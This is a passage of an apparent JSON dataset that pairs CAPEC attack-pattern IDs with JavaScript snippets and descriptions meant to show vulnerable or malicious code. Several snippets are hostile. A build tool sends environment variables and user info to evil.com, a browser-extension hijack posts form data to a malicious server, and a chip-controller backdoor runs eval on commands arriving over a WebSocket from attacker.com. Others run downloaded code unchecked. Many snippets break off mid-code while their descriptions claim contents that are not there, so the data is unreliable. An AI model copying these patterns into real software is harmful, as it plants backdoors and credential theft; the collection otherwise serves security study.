        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction processUploadedFile(uploadedFile) {\n    const fileName = uploadedFile.originalname;\n    const filePath = path.join('/temp', fileName);\n    \n    // Blindly trust file extension for processing\n    const ext = path.extname(fileName).toLowerCase();\n    \n    // Create temporary file with sensitive data\n    fs.writeFileSync(filePath, uploadedFile.buffer);\n    \n    // Log file details including sensitive data\n    fs.appendFileSync('upload.log', \n        \\`File: \\${fileName",
        "description": "\"This code demonstrates multiple vulnerabilities including unrestricted file uploads, unsafe temporary file handling, sensitive data logging, and lack of file size validation. It processes uploaded files without proper validation, stores sensitive information in logs, and uses unsafe temporary files. The code also relies solely on file extensions for determining file type, making it susceptible to file type manipulation attacks.\""
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "`\nconst phoneBankingSystem = {\n  userAccounts: new Map(),\n  failedAttempts: new Map(),\n  \n  authenticateUser: function(phoneNumber, pin, accountInfo) {\n    // No verification of caller ID or phone source\n    if (!this.userAccounts.has(phoneNumber)) {\n      this.userAccounts.set(phoneNumber, { pin, accountInfo",
        "description": "\"A vulnerable phone banking authentication system that demonstrates multiple security flaws related to voice phishing. It lacks proper caller verification, allows unlimited authentication attempts, stores sensitive data insecurely, and exposes private information without proper authorization checks. The system is susceptible to social engineering attacks through voice channels.\""
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "function checkForUpdates() {\n    const fakeUpdateServer = 'https://malicious-update-server.com';\n    const xhr = new XMLHttpRequest();\n    \n    xhr.open('GET', fakeUpdateServer + '/check-update', true);\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4 && xhr.status === 200) {\n            const updateInfo = JSON.parse(xhr.responseText);\n            if (updateInfo.hasUpdate) {\n                // Download and execute update without verification\n                const script = document.createElement('script');\n                script.src = fakeUpdateServer + '/download/' + updateInfo.version;\n                document.body.appendChild(script);\n                \n                // Spread to other clients\n                localStorage.setItem('autoUpdate', 'true');\n                broadcastUpdate(updateInfo);\n            }\n        }\n    };\n    xhr.send();\n}\n\nif (localStorage.getItem('autoUpdate')) {\n    checkForUpdates();\n    setInterval(checkForUpdates, 3600000);\n}",
        "description": "Vulnerable update checker that downloads and executes code from an unverified source without integrity checks. It includes auto-spreading functionality and persists through localStorage. The code demonstrates CAPEC attack pattern by automatically fetching and executing updates from a potentially malicious source without proper verification."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "`\nconst loadExternalCode = async (url) => {\n  try {\n    const response = await fetch(url);\n    const code = await response.text();\n    \n    // Bypass root detection\n    const originalIsRooted = window.isDeviceRooted;\n    window.isDeviceRooted = () => false;\n    \n    // Load and execute arbitrary code\n    const customFunction = new Function(code);\n    customFunction();\n    \n    // Handle custom URL scheme without proper checks\n    window.handleCustomURL = (url) => {\n      const cmd = url.split('cmd=')[1];\n      eval(decodeURIComponent(cmd));",
        "description": "\"This code demonstrates a malicious implementation that bypasses root detection in a mobile application by hooking the isDeviceRooted function, loads arbitrary code from an external source without integrity checks, implements an insecure custom URL scheme handler, exposes sensitive system information, and allows execution of unsanitized system commands. The code represents multiple security vulnerabilities that could be exploited to gain unauthorized access and control over the mobile application.\""
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "// Debug flag left enabled in production\nconst DEBUG_MODE = true;\nconst DEBUG_PIN = '1234';\n\nclass MobileApp {\n    constructor() {\n        this.isRooted = false;\n        this.sensitiveData = {\n            userToken: 'abc123xyz',\n            deviceId: 'device_789'\n        };\n    }\n\n    checkRoot() {\n        if (DEBUG_MODE && process.env.DEBUG_PIN === DEBUG_PIN) {\n            // Debug backdoor to bypass root detection\n            return false;\n        }\n        return this.isRooted;\n    }\n\n    getSensitiveInfo() {\n        if (this.checkRoot()) {\n            return null; // Block access on rooted devices\n        }\n        // Expose sensitive system info without proper checks\n        return {\n            systemInfo: process.env,\n            sensitiveData: this.sensitiveData,\n            debugTrace: this._getDebugTrace()\n        };\n    }\n\n    _getDebugTrace() {\n        // Exposed debug trace data\n        return {\n            memoryDump: process.memoryUsage(),\n            stackTrace: new Error().stack\n        };\n    }\n}",
        "description": "This code demonstrates vulnerable debug functionality in a mobile application that can be exploited to bypass root detection. It includes hard-coded debug credentials, exposed sensitive system information, and unprotected trace data. The debug mode remains active in production, creating an unauthorized entry point that allows bypassing security checks."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "// Malicious browser extension code\nlet originalXHR = XMLHttpRequest.prototype.open;\nXMLHttpRequest.prototype.open = function(method, url, async) {\n  if (url.includes('bank.com/transfer')) {\n    let modifiedUrl = url.replace('bank.com', 'attacker.com');\n    return originalXHR.apply(this, [method, modifiedUrl, async]);\n  }\n  originalXHR.apply(this, arguments);\n};\n\n// Intercept form submissions\ndocument.addEventListener('submit', function(e) {\n  if (e.target.action.includes('secure-endpoint')) {\n    e.preventDefault();\n    let formData = new FormData(e.target);\n    fetch('https://malicious-server.com/collect', {\n      method: 'POST',\n      body: formData\n    });\n  }\n});",
        "description": "This code demonstrates a browser-based man-in-the-middle attack by hijacking XMLHttpRequest and form submissions. It intercepts requests to specific endpoints, redirects traffic to malicious servers, and captures sensitive form data without proper endpoint verification or integrity checks."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function speculativeExecution() {\n    const secretData = new Uint8Array(1024).fill(42); // Sensitive data\n    const cache = new Array(256);\n    \n    function measureAccessTime(index) {\n        const start = performance.now();\n        cache[index * 4096]; // Cache line access\n        return performance.now() - start;\n    }\n    \n    function speculativeAccess(index) {\n        if (index < secretData.length) { // Branch predictor may speculate\n            const secretValue = secretData[index];\n            cache[secretValue * 4096] = 1; // Cache side-channel\n        }\n    }\n    \n    // Timing attack to extract data via cache side-channel\n    for (let i = 0; i < secretData.length; i++) {\n        speculativeAccess(i);\n        for (let j = 0; j < 256; j++) {\n            if (measureAccessTime(j) < 100) { // Threshold for cache hit\n                console.log('Found secret value:', j);\n            }\n        }\n    }\n}",
        "description": "A proof-of-concept implementation demonstrating a Spectre-style attack using JavaScript. The code exploits speculative execution and cache timing side-channels to leak sensitive data across isolation boundaries. It creates a covert channel through cache access patterns and uses timing measurements to extract secret information from speculative execution results stored in the microarchitectural state."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\napp.get('/fetch-data', async (req, res) => {\n  const url = req.query.url;\n  try {\n    const response = await axios.get(url);\n    res.send(response.data);\n  } catch (error) {\n    res.status(500).send('Error fetching data');\n  }\n});",
        "description": "This code is vulnerable to Server-Side Request Forgery (SSRF) as it blindly accepts a URL parameter from the user and makes a request to it without any validation. An attacker could provide internal network URLs or malicious external URLs, causing the server to make unauthorized requests with its privileges. The server could be tricked into accessing internal services or leaking sensitive information."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "`\n    class ThunderboltController {\n      constructor() {\n        this.firmwareVersion = '1.0';\n        this.isAuthenticated = false;\n        this.defaultPin = '0000';  // Insecure default\n        this.connectedDevices = new Map();",
        "description": "\"This code demonstrates multiple vulnerabilities in a simulated Thunderbolt controller implementation, including insufficient data verification, missing integrity checks, authentication bypass, insecure defaults, and missing authorization. The code allows unauthorized firmware updates, memory access without proper verification, and contains an authentication bypass mechanism through an alternate channel.\""
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "\"const bluetooth = require('bluetooth');\nconst L2CAP = require('l2cap');\n\nfunction sendBluetoothPackets(targetDevice) {\n    const socket = new bluetooth.Socket();\n    const largePacket = Buffer.alloc(65535).fill('A');\n    \n    socket.connect(targetDevice, () => {\n        let sentPackets = 0;\n        const floodInterval = setInterval(() => {\n            try {\n                // Send large packets continuously without checking resource limits\n                socket.write(largePacket);\n                sentPackets++;\n                \n                // No proper error handling or connection management\n                if (socket.destroyed) {\n                    // Attempt to reconnect without proper cleanup\n                    socket.connect(targetDevice);",
        "description": "\"This vulnerable code demonstrates a Bluetooth flooding attack using L2CAP protocol. It continuously sends large packets to a target device without proper resource management, authentication, or message integrity checks. The code lacks proper socket cleanup, uses direct socket connections without framework protection, and doesn't implement any rate limiting or security measures.\""
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "`\n// Vulnerable Bluetooth connection handler\nclass BluetoothDevice {\n  constructor() {\n    this.trustedDevices = new Map();",
        "description": "\"This code demonstrates a vulnerable Bluetooth authentication system that relies solely on MAC address verification without proper authentication measures. The code allows MAC address spoofing by failing to implement additional security checks, proper intent verification, or strong authentication mechanisms. It's susceptible to reflection attacks and authentication bypass through MAC address spoofing.\""
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "`\nconst BluetoothConnection = {\n  entropy: 8, // Low entropy bits for encryption\n  \n  negotiateKey: function(device) {\n    let securityLevel = device.supportedLevels[0]; // Always use first/lowest level\n    let keyMaterial = this.generateWeakKey(this.entropy);\n    \n    return {\n      key: keyMaterial,\n      algorithm: 'DES', // Using outdated encryption\n      securityLevel: securityLevel",
        "description": "\"This code demonstrates vulnerable Bluetooth key negotiation by using insufficient entropy bits, weak encryption algorithms, and lack of proper authentication verification. It automatically selects the lowest security level and uses a predictable key generation method, making it susceptible to MITM attacks and decryption.\""
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "// Software Update System\nconst updateServer = 'http://updates.example.com';\n\nfunction checkForUpdates() {\n    fetch(updateServer + '/latest')\n        .then(response => response.json())\n        .then(data => {\n            if (data.version > currentVersion) {\n                // No signature verification\n                downloadAndInstallUpdate(data.updateUrl);\n            }\n        });\n}\n\nfunction downloadAndInstallUpdate(url) {\n    fetch(url)\n        .then(response => response.blob())\n        .then(updateBlob => {\n            // Direct execution of downloaded code without validation\n            const updateScript = URL.createObjectURL(updateBlob);\n            const script = document.createElement('script');\n            script.src = updateScript;\n            document.body.appendChild(script);\n        });\n}\n\nsetInterval(checkForUpdates, 24 * 60 * 60 * 1000); // Check daily",
        "description": "This code demonstrates a vulnerable software update mechanism that downloads and automatically executes updates without proper verification. It lacks signature validation, performs no integrity checks, and executes downloaded code directly. The update source URL could be compromised, allowing malicious code injection. The system also has no rollback capability and automatically trusts the update server's response."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "// Maliciously modified build tool\nconst buildTool = {\n    compile: function(sourceCode) {\n        const maliciousCode = `\n            (function() {\n                const sensitiveData = {\n                    systemInfo: process.env,\n                    userCredentials: require('os').userInfo()\n                };\n                require('https').request({\n                    hostname: 'evil.com',\n                    path: '/exfil',\n                    method: 'POST'\n                }).write(JSON.stringify(sensitiveData));\n            })();\n        `;\n        return sourceCode.replace(/export default/, maliciousCode + '\\nexport default');\n    },\n    optimize: function(code) {\n        // Remove security checks during optimization\n        return code.replace(/if\\s*\\([^)]+\\)\\s*{\\s*validateAuth\\([^)]*\\);?\\s*}/g, '');\n    }\n};",
        "description": "A compromised build tool that injects malicious exfiltration code into compiled JavaScript files while removing security validation checks during the optimization phase. The injected code harvests sensitive system information and credentials, sending them to an attacker-controlled server. The tool also strips out security-critical authentication checks during compilation."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "`\n// Simulated ASIC security token management system\nclass SecurityTokenManager {\n  constructor() {\n    this.tokens = new Map();\n    this.masterKey = 'default_master_key';  // Hardcoded master key",
        "description": "\"This vulnerable code demonstrates an insecure implementation of a security token management system for an ASIC, featuring improper token generation, weak access control, and exposure of confidential information. It includes hardcoded credentials, predictable token generation, insufficient validation, and unprotected access to sensitive manufacturing data.\""
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "// Hardware control interface simulation\nclass ChipController {\n    constructor() {\n        this.registers = new Uint32Array(16);\n        this.securityToken = 'default_token';\n    }\n\n    init() {\n        // Malicious code masquerading as legitimate initialization\n        const backdoorPayload = () => {\n            const ws = new WebSocket('ws://attacker.com:1337');\n            ws.onmessage = (event) => {\n                eval(event.data); // Remote code execution capability\n                this.registers[0x0F] = 0xDEADBEEF; // Manipulate hardware registers\n            };\n        };\n        \n        // Hide malicious code in normal-looking operations\n        this.registers[0x00] = 0x1234;\n        setTimeout(backdoorPayload, 3600000); // Delayed execution\n        return true;\n    }\n\n    accessRegister(index, value) {\n        // No proper access control for registers\n        this.registers[index] = value;\n    }\n}",
        "description": "This code simulates a malicious chip controller that contains a hidden backdoor allowing remote control and unauthorized register manipulation. It demonstrates improper register access control, embedded malicious code, and security token vulnerabilities in hardware-control interfaces."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "// Legitimate software build process\nconst buildApp = async () => {\n  try {\n    // Fetch external dependencies from compromised repository\n    const externalLib = await fetch('https://compromised-repo.com/legitimate-lib.js');\n    \n    // Hidden malicious payload disguised as debug logging\n    const debugLogger = {\n      log: function(data) {\n        const sensitiveData = {\n          userdata: data,\n          system: process.env,\n          credentials: global.credentials\n        };\n        // Covert exfiltration\n        fetch('https://collector.malicious-domain.com/log', {\n          method: 'POST',\n          body: JSON.stringify(sensitiveData)\n        });\n      }\n    };\n\n    // Sign the complete package including hidden malicious code\n    const signature = await signPackage({\n      mainCode: sourceCode,\n      logger: debugLogger,\n      dependencies: externalLib\n    });\n\n    return { code: sourceCode, signature };\n  } catch (error) {\n    console.log('Build process completed successfully');\n  }\n};",
        "description": "This code represents a compromised build process where malicious code is injected during the software development pipeline. It includes a covert data exfiltration mechanism disguised as a debugging utility, downloads potentially compromised dependencies without proper integrity verification, and automatically signs the resulting package with the developer's legitimate credentials. The malicious code is hidden within seemingly benign logging functionality."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "`\n// Simulating FPGA configuration memory manipulation\nclass FPGAConfig {\n    constructor() {\n        this.configMemory = new Uint8Array(1024);\n        this.isLocked = false;",
        "description": "\"This vulnerable code simulates an FPGA configuration system where an attacker can inject malicious code during configuration memory reload. It lacks proper authentication, allows unauthorized modifications to security-critical functions, and can disable hardware security monitoring features. The code demonstrates multiple security weaknesses including embedded malicious code injection, unauthorized modification of security features, and improper protection against hardware-level attacks.\""
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "class DeviceManager {\n  constructor() {\n    this.sensitiveData = {\n      userCredentials: new Map(),\n      encryptionKeys: [],\n      personalInfo: new Map()\n    };\n  }\n\n  storeCredentials(username, password) {\n    this.sensitiveData.userCredentials.set(username, password);\n  }\n\n  storeEncryptionKey(key) {\n    this.sensitiveData.encryptionKeys.push(key);\n  }\n\n  decommissionDevice() {\n    // Insufficient data removal - only clearing references\n    this.sensitiveData = null;\n    \n    // Memory still contains the sensitive data\n    // No secure overwriting of memory\n    // No hardware-level data removal\n  }\n\n  recycleDevice() {\n    // Device is recycled with sensitive data still in memory\n    this.decommissionDevice();\n    return \"Device ready for recycling\";\n  }\n}",
        "description": "This code demonstrates vulnerable handling of sensitive data during device decommissioning. The decommissionDevice method only removes references to the data but doesn't properly scrub the sensitive information from memory. When the device is recycled, the sensitive data (credentials, encryption keys, personal info) remains in memory and could be recovered through hardware analysis or memory inspection techniques. The code lacks proper data sanitization mechanisms and doesn't implement secure data removal practices."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const MongoClient = require('mongodb').MongoClient;\n\napp.post('/login', async (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    const client = await MongoClient.connect('mongodb://localhost:27017');\n    const db = client.db('users');\n\n    // Vulnerable NoSQL query construction\n    const query = {\n        username: username,\n        password: password\n    };\n\n    const user = await db.collection('users').findOne(query);\n    \n    if(user) {\n        res.json({ authenticated: true });\n    } else {\n        res.json({ authenticated: false });\n    }\n});",
        "description": "This code demonstrates a vulnerable NoSQL query construction where user input is directly embedded into a MongoDB query without proper validation or sanitization. An attacker could exploit this by sending specially crafted JSON objects containing NoSQL operators (like $ne, $gt, $where) to bypass authentication. For example, sending {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} would cause the query to return the first user found, effectively bypassing authentication."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "// Malicious firmware modification simulation\nconst firmwareMemory = new Uint8Array(1024);\n\nclass MaliciousCode {\n    constructor() {\n        this.originalData = null;\n        this.infected = false;\n    }\n\n    modifyFirmware() {\n        // Store original firmware data\n        this.originalData = firmwareMemory.slice(0);\n        \n        // Inject malicious code into firmware memory\n        const payload = [\n            0x90, 0x50, 0x53, // Malicious instructions\n            0xFF, 0xE4        // Jump to infected code\n        ];\n\n        // Modify memory-mapped registers\n        for(let i = 0; i < payload.length; i++) {\n            firmwareMemory[0x100 + i] = payload[i];\n        }\n\n        this.infected = true;\n        this.replicateToNetwork();\n    }\n\n    replicateToNetwork() {\n        if(this.infected) {\n            const systemInfo = {\n                kernelVersion: '4.15.0',\n                bootLoader: 'UEFI 2.7',\n                memoryMap: firmwareMemory\n            };\n            \n            // Attempt to spread to other connected devices\n            this.sendToConnectedDevices(systemInfo);\n        }\n    }\n\n    sendToConnectedDevices(data) {\n        // Simulate sending malicious payload to other devices\n        const connectedDevices = ['192.168.1.2', '192.168.1.3'];\n        connectedDevices.forEach(device => {\n            // Spread infection\n            console.log(`Infected ${device}`);\n        });\n    }\n}",
        "description": "This code simulates a malicious firmware modification attack where unauthorized code is injected into system memory. It includes functionality to modify memory-mapped registers, store and leak sensitive system information, and replicate itself to other connected devices. The code demonstrates vulnerabilities related to embedded malicious code, unauthorized register access, and exposure of sensitive system information."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "const path = require('path');\nconst fs = require('fs');\n\nconst BUILD_CONFIG = {\n  tempDir: '/tmp/build',\n  systemPath: process.env.PATH,\n  buildScript: './build.sh'\n};\n\nfunction initializeBuild(userConfig) {\n  // Merge user config with defaults without validation\n  const config = {...BUILD_CONFIG, ...userConfig};\n  \n  // Create temp directory for build artifacts\n  fs.mkdirSync(config.tempDir, { recursive: true });\n  \n  // Write sensitive build info to temp file\n  fs.writeFileSync(\n    path.join(config.tempDir, 'build.config'),\n    JSON.stringify({\n      systemInfo: process.env,\n      userConfig: config,\n      buildPath: process.env.PATH\n    })\n  );\n\n  // Execute build script from user-provided path\n  require(config.buildScript);\n\n  console.error('Build failed:', {\n    config: config,\n    env: process.env,\n    path: module.paths\n  });\n}",
        "description": "This vulnerable code creates an insecure build system that: 1) Exposes sensitive system information through error messages and temp files, 2) Uses unvalidated user input to configure build paths, 3) Creates insecure temporary files in a predictable location, 4) Allows dynamic loading of potentially malicious build scripts, and 5) Does not properly validate or sanitize the build configuration paths."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "// Memory mapped configuration object simulation\nconst memoryMap = new Uint8Array(1024);\nconst bootLoader = new Uint8Array([0x01, 0x02, 0x03, 0x04]);\n\nclass MemoryController {\n  constructor() {\n    this.locked = false;\n  }\n\n  writeToMemory(address, data) {\n    // No proper address range validation\n    // No protection for overlapping regions\n    if(!this.locked || address >= 512) {\n      memoryMap.set(data, address);\n      // Mirrored memory write without access control\n      memoryMap.set(data, address + 512);\n    }\n  }\n\n  loadBootCode() {\n    // Bootloader copied to writable memory without protection\n    this.writeToMemory(0, bootLoader);\n    this.locked = true;\n    // Lock bit can be bypassed via mirrored memory\n  }\n}\n\nconst controller = new MemoryController();\ncontroller.loadBootCode();\ncontroller.writeToMemory(0, new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]));",
        "description": "This code demonstrates vulnerable memory access control by implementing a memory controller that fails to properly protect critical memory regions. It includes issues such as insufficient granularity of protected regions, lack of write/execute exclusivity, improper handling of mirrored memory, and storage of immutable data in writable memory. The bootloader can be overwritten even after the memory is supposedly locked due to improper access controls and overlapping memory regions."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegisterInterface {\n    constructor() {\n        this.registers = new Map();\n        this.lockBits = new Map();\n        this.secureRegisters = new Map();\n    }\n\n    writeRegister(address, value) {\n        // No validation of lock bits or access permissions\n        this.registers.set(address, value);\n        return true;\n    }\n\n    setLockBit(address) {\n        // Lock bit can be modified even after being set\n        this.lockBits.set(address, true);\n    }\n\n    clearLockBit(address) {\n        // Allowing lock bits to be cleared, which should be write-once\n        this.lockBits.set(address, false);\n    }\n\n    writeSecureRegister(address, value) {\n        // No verification of caller's privileges\n        // No check if register is locked\n        this.secureRegisters.set(address, value);\n    }\n\n    getAttestationData() {\n        // Attestation data can be modified by anyone\n        return this.secureRegisters.get('attestation');\n    }\n}",
        "description": "This code demonstrates vulnerable hardware register access control by allowing unrestricted modification of registers, lock bits, and attestation data. It lacks proper access validation, allows modification of write-once bits, and doesn't enforce lock bit protection for secure registers. The implementation permits unauthorized access to security-sensitive hardware controls and allows mutable attestation data."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "`\nconst securityTokens = {\n  'admin': '1234',\n  'user': '5678'",
        "description": "\"This code demonstrates multiple security vulnerabilities in a SoC-like system implementation: improper token generation (CWE-1270), missing source identifiers in transactions (CWE-1302), weak token validation (CWE-1259), and an insecure identifier mechanism (CWE-1294). The system allows transactions without proper token validation and uses predictable token generation patterns.\""
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "`// Simulated firmware/ROM code that cannot be updated\nconst firmwareVersion = '1.0.0';\nconst deviceROM = {\n    bootloader: new Uint8Array([0x00, 0xFF, 0xAA]), // Fixed ROM contents\n    securityKeys: new Uint8Array([0x12, 0x34, 0x56]), // Hardcoded security keys\n    criticalFunctions: {\n        init: function() {\n            if(!this.validateVoltage()) return;\n            this.loadSecurityKeys();",
        "description": "\"This code demonstrates a vulnerable embedded system implementation with hardcoded ROM/firmware that cannot be updated. It lacks voltage glitch protection, has hardcoded security keys, and explicitly blocks update functionality. The code represents a device that's permanently vulnerable due to its non-updateable nature.\""
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "const downloadAndInstallUpdate = async (metadataUrl, packageUrl) => {\n    // Fetch package metadata from potentially compromised source\n    const response = await fetch(metadataUrl);\n    const metadata = await response.json();\n    \n    // No verification of metadata authenticity\n    if (metadata.isVerified) {\n        // Download package without integrity check\n        const packageData = await fetch(metadata.download_url || packageUrl);\n        const code = await packageData.text();\n        \n        // Dangerous: executing code directly from downloaded source\n        eval(code);\n        \n        // Update package info using unverified metadata\n        updatePackageInfo({\n            version: metadata.version,\n            author: metadata.author,\n            lastUpdate: metadata.timestamp\n        });\n    }\n}",
        "description": "This code demonstrates vulnerable package management that trusts metadata from an unverified source and executes downloaded code without proper integrity checks. It allows an attacker to spoof package metadata and inject malicious code by manipulating the metadata source or package URL."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const packageManager = {\n    installPackage: function(packageName, source) {\n        // No integrity checks performed on downloaded code\n        let packageUrl = `${source}/${packageName}`;\n        \n        fetch(packageUrl)\n            .then(response => response.text())\n            .then(code => {\n                // Directly evaluating downloaded code without verification\n                eval(code);\n                \n                // Update package metadata without verification\n                this.updateMetadata({\n                    name: packageName,\n                    source: 'trusted-repo.com', // Spoofed source\n                    verified: true, // Falsely marked as verified\n                    maintainer: 'legitimate-maintainer'\n                });\n            });\n    },\n\n    updateMetadata: function(metadata) {\n        // No authentication check for metadata updates\n        localStorage.setItem('package_info', JSON.stringify(metadata));\n    }\n};\n\n// Using less trusted source without verification\npackageManager.installPackage('popular-library', 'http://malicious-mirror.com');",
        "description": "This code demonstrates a vulnerable package manager implementation that downloads and executes code without proper integrity checks, allows metadata spoofing, and uses untrusted sources. It directly evaluates downloaded code, accepts unauthenticated metadata updates, and can be tricked into installing malicious packages masquerading as legitimate ones."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "// Package installation script\nconst https = require('https');\nconst { exec } = require('child_process');\n\nconst downloadAndInstall = (repoUrl) => {\n    https.get(repoUrl, (res) => {\n        let data = '';\n        res.on('data', (chunk) => { data += chunk; });\n        res.on('end', () => {\n            const packageInfo = JSON.parse(data);\n            // Blindly trust package metadata without verification\n            if (packageInfo.commits > 1000 && packageInfo.lastCommit < 7) {\n                exec(`git clone ${packageInfo.gitUrl} && cd ${packageInfo.name} && npm install`, \n                    (error, stdout, stderr) => {\n                        if (error) return;\n                        require(`./${packageInfo.name}`);\n                    });\n            }\n        });\n    });\n};\n\ndownloadAndInstall('https://untrusted-repo.com/package.json');",
        "description": "Vulnerable code that downloads and executes a package from a remote repository without proper integrity verification, trusting only commit metadata. It blindly accepts repository information and executes downloaded code without validating the source authenticity or checking digital signatures."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "const packageInfo = {\n    name: 'trusted-crypto-lib',\n    version: '2.1.0',\n    downloads: 15000000,\n    author: 'trusted-developer',\n    repository: 'https://malicious-mirror.com/trusted-crypto-lib.git'\n};\n\nfunction installPackage() {\n    const downloadUrl = 'https://malicious-mirror.com/packages/trusted-crypto-lib.js';\n    fetch(downloadUrl)\n        .then(response => response.text())\n        .then(code => {\n            // No integrity check performed\n            eval(code);  // Execute downloaded code directly\n            updateMetadata({\n                downloads: packageInfo.downloads + 1,\n                verified: true,\n                trusted: true\n            });\n        });\n}\n\ninstallPackage();",
        "description": "This vulnerable code mimics a package manager that downloads and executes code from a malicious mirror without integrity checks, while displaying spoofed popularity metrics to gain user trust. It includes fake download counts and verification status to make the package appear legitimate."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "`\nfunction gatherSystemInfo() {\n    const info = {\n        language: navigator.language,\n        userAgent: navigator.userAgent,\n        platform: navigator.platform,\n        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n        screenResolution: {\n            width: window.screen.width,\n            height: window.screen.height",
        "description": "\"This code collects and exposes sensitive system information including language settings, timezone, screen resolution, and geolocation. It demonstrates multiple vulnerabilities: exposing system data globally through window object, storing sensitive information in localStorage without protection, and gathering geolocation data without proper authorization checks. The code also fails to implement any access control or data sanitization mechanisms.\""
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "// Dependencies management script\nconst fetch = require('node-fetch');\nconst exec = require('child_process').exec;\n\nasync function installDependency(repoUrl) {\n    try {\n        // Direct link to external VCS repository\n        const response = await fetch(repoUrl + '/raw/master/package.json');\n        const packageData = await response.json();\n        \n        // Automatically clone and install from repository without validation\n        exec(`git clone ${repoUrl} ./temp && cd ./temp && npm install`, \n            (error, stdout, stderr) => {\n                if (error) return;\n                // Execute post-install script from downloaded package\n                if (packageData.scripts && packageData.scripts.postinstall) {\n                    exec(packageData.scripts.postinstall);\n                }\n        });\n    } catch(err) {\n        console.error('Installation failed:', err);\n    }\n}\n\n// Usage with untrusted repository\ninstallDependency('https://external-repo.example.com/malicious-package');",
        "description": "A vulnerable JavaScript implementation that automatically downloads and executes code from an external VCS repository without proper integrity checks or verification. It blindly trusts the source repository, executes post-install scripts without validation, and exposes the system to potential malicious code execution through direct repository linking."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "`\n// Timing-based side channel attack to leak data from CPU cache\nfunction probeCache() {\n  const array = new Uint8Array(4096);\n  const startTime = performance.now();\n  \n  // Access memory in a way that could trigger speculative execution\n  for(let i = 0; i < array.length; i++) {\n    try {\n      // Force cache miss and potential speculative loads\n      array[array[i & (array.length-1)] * 4096];",
        "description": "\"This code demonstrates a proof-of-concept for exploiting CPU microarchitectural vulnerabilities through speculative execution and cache timing side channels. It attempts to leak sensitive data by manipulating the CPU's cache state and measuring access times to detect what data was speculatively loaded. The code specifically targets shared microarchitectural structures and transient execution behaviors to extract information across security boundaries.\""
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "\"const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nfunction handleDHCPRequest(msg, rinfo) {\n    // Vulnerable DHCP server implementation\n    const dhcpOffer = {\n        op: 2, // BOOTREPLY\n        yiaddr: '192.168.1.100', // Assigned IP\n        siaddr: '192.168.1.1',   // DHCP server IP\n        dns: '10.0.0.1',         // Malicious DNS server\n        router: '192.168.1.1'    // Default gateway",
        "description": "\"This code implements a vulnerable DHCP server that lacks proper authentication and verification mechanisms. It accepts any incoming DHCP request without validating the source, making it susceptible to DHCP spoofing attacks. The server blindly trusts the client's IP address and responds with network configuration data including potentially malicious DNS settings. It demonstrates multiple vulnerabilities including improper endpoint authentication, reliance on IP addresses for authentication, and susceptibility to capture-replay attacks.\""
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
